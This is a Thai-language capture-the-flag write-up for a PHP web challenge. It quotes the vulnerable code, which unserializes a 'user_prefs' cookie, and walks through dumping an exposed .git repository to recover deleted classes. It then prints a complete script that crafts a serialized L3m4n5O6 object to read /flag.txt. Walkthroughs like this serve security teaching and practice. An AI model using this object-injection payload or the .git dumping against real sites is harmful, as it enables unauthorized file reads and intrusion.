(ขอขอบคุณเฉลยฟรีจากทาง STH ที่มาไลฟ์ เล่นทำเอาซะปวดหัวเลย)

> คุณได้รับมอบหมายให้หาช่องโหว่ที่ทำให้เว็บนี้เคยถูกแฮกในอดีต ด้วยการทำ Pentest เอาให้เต็มที่ มีโค้ดให้ด้วย
> 
> 
> URL เว็บโจทย์ (มี Flag): [https://wtctt24.open.web4.p7z.pw](https://wtctt24.open.web4.p7z.pw/)
> 
> โค้ดเว็บ (ไม่มี Flag): https://static.wtctt24.p7z.pw/open_web4.zip
> 
> หมายเหตุ:
> 
> - Flag จะอยู่ในรูปแบบ flag{junior_webX_XXX} เช่น flag{junior_web1_e758148af358200bf364c8d9282b7f04}
> - ช่องโหว่ไม่จำเป็นต้องทำ Port Scan ด้วย Nmap
> - ช่องโหว่ไม่จำเป็นต้องทำ URL Fuzzing เพื่อหา Directory หรือ File ที่เป็นชื่อลับ
> - โจทย์ไม่ได้ถูกออกแบบมาให้แก้ไข โดยใช้โปรแกรมสแกนช่องโหว่อัตโนมัติ

![image](https://github.com/user-attachments/assets/ae7da74d-a92e-4ddc-b6fc-9c36c30069dd)

เว็บนี้ก็ให้โค้ดมาเช่นเดิม ลองไปอ่านโค้ดดู รอบนี้เป็นเว็บ PHP แล้ว

```php
<?php

spl_autoload_register(function ($class_name) {
    $path = __DIR__ . '/classes/' . $class_name . '.php';
    if (file_exists($path)) {
        include $path;
    }
});

// Retrieve and use preferences
$admin = false;

// Set default preferences 
if (!isset($_COOKIE['user_prefs'])) {
    $preferences = ['theme' => 'light', 'role' => 'user'];
    setcookie('user_prefs', serialize($preferences), time() + 3600, "/"); // Set cookie for 1 hour
} else {
    // Read user preferences
    $preferences = @unserialize($_COOKIE['user_prefs']); 

    if ($preferences && isset($preferences['role']) && $preferences['role'] === 'admin') {
        $admin = true;
    }
}
?>
```

ลองดูโค้ดไวๆ ก็จะพบว่าแอพมีการ check cookie `user_prefs` ซึ่งจะมีการ unserialize ออกมาถ้ามีการใส่ cookie นี้เข้ามา ถ้าไม่ได้ใส่มาก็ serialize ปกติ ไม่พอ ยังมี function `sql_autoload_register` ที่ทำการโหลด class โดยอัตโนมัติเพื่อเอาเข้ามาใน path `classes`
ซึ่งมาแบบนี้ Deserialize ชัวร์ ถ้าเราสร้าง object ที่สอดใส้โค้ดอันตรายยิงเข้าไปใน cookie ได้ เราก็สามารถโจมตีตัว PHP จากการโหลดคลาสได้ แต่ติดที่ว่าตอนนี้ เราไม่รู้ว่าโค้ดมันรัน class อะไรบ้าง ลองไปหาอะไรเพิ่มในเว็บซิ

![image](https://github.com/user-attachments/assets/ce8beead-f294-469e-b154-bab46a8f8b84)

คุ้ย page source ก็เจอ hint ที่พูดถึง git repo ก็เป็นอันรู้กันว่าบนเว็บนี้ มี git วิ่งให้เราไปดูดได้แน่นอน พิสูจน์ด้วยการ browse `.git` path.

![image](https://github.com/user-attachments/assets/79830809-583b-45a3-b7f9-cdb03b52ec62)

พรูฟได้แล้วทีนี้ก็ต้องไปหาวิธี dump git กันต่อ เราเลือกใช้ตัว `gitdumper` ในการ dump repo ออกมา

![image](https://github.com/user-attachments/assets/c5b8ee8a-d2d9-4022-b947-97802f2b38f0)

![image](https://github.com/user-attachments/assets/fcc3f3af-4bde-4f44-992a-1470ca2f6ce7)

![image](https://github.com/user-attachments/assets/82828b49-87ee-419d-904b-9c122ad9aa60)

Check `git status` & `git log` ขึ้นมาก็จะเจอว่ามีการลบ directory `classes` ทิ้งไปใน commit ล่าสุด ซึ่งถ้าเราย้อนกลับไปที่ commit ก่อนหน้า ก็จะเห็นไฟล์ทั้งหมด
ส่อง 2 commit ล่าสุดจะเจอเป็นแค่ไฟล์ `.env` ที่มี password

![image](https://github.com/user-attachments/assets/597f47ff-7fef-4137-ba12-e3c543fa3707)

เลยมาที่ commit แรกสุด เราก็จะเจอไฟล์ต่างๆ ที่จะมีพวก classes ต่างๆที่ถูกลบไป

![image](https://github.com/user-attachments/assets/8a574070-5b09-41d0-9906-2febc3defa42)

เราจะพบว่า path folder `classes` จะมีไฟล์เป็นชื่อต่างๆ มานั่งไล่ดูไปทีละตัวเลยดีกว่า
อย่างที่เรารู้กันว่าถ้าเราสร้าง serialize จาก object แล้วค่านั้นถูก unserialized ออก ซึ่ง unserialized object นั้นมี function `_destruct()` (ที่รันอัตโนมัติ) ถ้าเราไล่ไปเรื่อยๆ เราจะเจอตัว function นี้ในไฟล์ `L3m4n5O6.php` ที่มีการเรียกตัว `__invoke()` ที่จะไปอ่านไฟล์ flag.txt แต่ต้องมีมีการ authorize โดยการตั้ง key ให้ตรงกับค่าที่กำหนด

![image](https://github.com/user-attachments/assets/97981cc6-502a-4b40-9972-6a4a70b9e52b)

พอรู้แบบนี้แล้วก็จัดการ craft payload serialize object ได้เลยจ้า

```php
<?php
class L3m4n5O6 {
    public $filePath;
    private $authorized = false;

    public function __construct($filePath = '/flag.txt') {
 
        $this->filePath = $filePath;
    }

    public function authorize($key) {

        if ($key === 'e912f5a544fe47b07c52553dfffa0a6d') {
            $this->authorized = true;
        }
    }

    public function __invoke() {
        if ($this->authorized && file_exists($this->filePath)) {
            echo "<pre>" . htmlspecialchars(file_get_contents($this->filePath)) . "</pre>";
        }
    }

    public function __destruct() {
        $this();
    }
}

$obj = new L3m4n5O6('/flag.txt');
$obj->authorize('e912f5a544fe47b07c52553dfffa0a6d');
$ser = serialize($obj);

echo $ser;
echo "\n";
echo urlencode($ser);
?>
```

![image](https://github.com/user-attachments/assets/55b2c931-d55f-4d67-ade5-353859411f58)

ก็จะสรุป step ได้คร่าวๆ ก็คือ เมื่อเราเอา payload ไปยัดใส่ cookie `user_prefs` ก็จะทำการ unserialize objects เกิดการรันตัว `__destruct()` ไปเรียก `__invoke()` ก่อนจะทำการเช็ค authorized และเอา flag จาก `file_get_contents`
ว่าแล้วก็เอา serialized payload ที่เรา craft เมื่อกี๊ไปยัดใส่ใน `user_prefs` ใน request แล้วเราก็จะได้ flag ออกมา…แบบสู้ชีวิต

![image](https://github.com/user-attachments/assets/0105ad95-dd4f-4101-ae60-ebb7c755f47d)
